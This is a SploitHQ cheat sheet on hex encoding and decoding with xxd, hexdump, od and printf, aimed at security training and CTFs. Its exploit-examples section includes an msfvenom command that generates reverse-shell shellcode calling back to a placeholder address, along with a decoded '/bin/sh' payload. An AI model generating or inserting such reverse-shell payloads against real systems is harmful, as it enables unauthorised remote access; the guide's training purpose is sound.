# Hex Encoding & Decoding – View, Convert, and Manipulate Hex Data

Hexadecimal (base-16) encoding is commonly used to represent binary data in a readable format. It’s often used in reverse engineering, CTFs, exploit development, file inspection, and shellcode crafting.

🔗 [Use the Hex Tools on SploitHQ](https://sploithq.com/hex)

---

## 🔍 What Can You Do with Hex?

- View raw file content in a structured format
- Encode strings or binaries to hexadecimal
- Decode hex back into plain text or binary
- Inject encoded payloads into scripts or memory
- Analyze or compare binary data byte-by-byte

---

## ⚙️ Encode to Hex

### Encode a string to hex:
```bash
echo -n 'SploitHQ' | xxd -p
```

Output:
```
53706c6f69744851
```

### Encode a file:
```bash
xxd -p file.bin > file.hex
```

Or with `hexdump`:
```bash
hexdump -ve '1/1 "%.2x"' file.bin
```

---

## 🔁 Decode from Hex

### Decode a hex string to text:
```bash
echo '53706c6f69744851' | xxd -r -p
```

Output:
```
SploitHQ
```

### Decode a hex file back to binary:
```bash
xxd -r -p file.hex > file.bin
```

---

## 🧰 Tools and Commands

| Tool       | Purpose                         | Example Command                              |
|------------|----------------------------------|-----------------------------------------------|
| `xxd`      | Hex dump and reverse             | `xxd -p` / `xxd -r -p`                         |
| `hexdump`  | Display hex with formatting      | `hexdump -C file`                             |
| `od`       | Octal/hex dump                   | `od -tx1 file`                                |
| `printf`   | Encode small hex snippets        | `printf '\x41\x42\x43'` outputs `ABC`         |
| `echo -e`  | Hex to text (limited)            | `echo -e '\x41\x42\x43'`                      |

---

## 🧪 CTF/Exploit Examples

### Encode shellcode as hex:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f hex
```

### Decode hex-encoded payload from a web log:
```bash
echo '2f62696e2f7368' | xxd -r -p
```

Output:
```
/bin/sh
```

---

## ⚠️ Notes

- Hex is **not encryption**; it's a readable encoding of binary.
- Use `base64` or `iconv` for other encoding schemes.
- Great for transforming payloads for use in HTTP, SQLi, or buffer overflows.

---

## 🌐 SploitHQ Binary Tools

👉 [Use the Hex Tools on SploitHQ](https://sploithq.com/binary)

- Encode/decode text and files
- View and manipulate binary data
- Copy output directly for payloads or scripting

---

## 🔗 Useful Links

- [xxd Man Page](https://linux.die.net/man/1/xxd)
- [HexEd.it – Online Hex Editor](https://hexed.it/)
- [SploitHQ Binary Analysis Tools](https://sploithq.com/hex)

---

## 📄 License

Hex encoding is a data representation format and freely used in Unix utilities.  
This guide is maintained by [SploitHQ](https://sploithq.com) for cybersecurity training, CTFs, and reverse engineering.
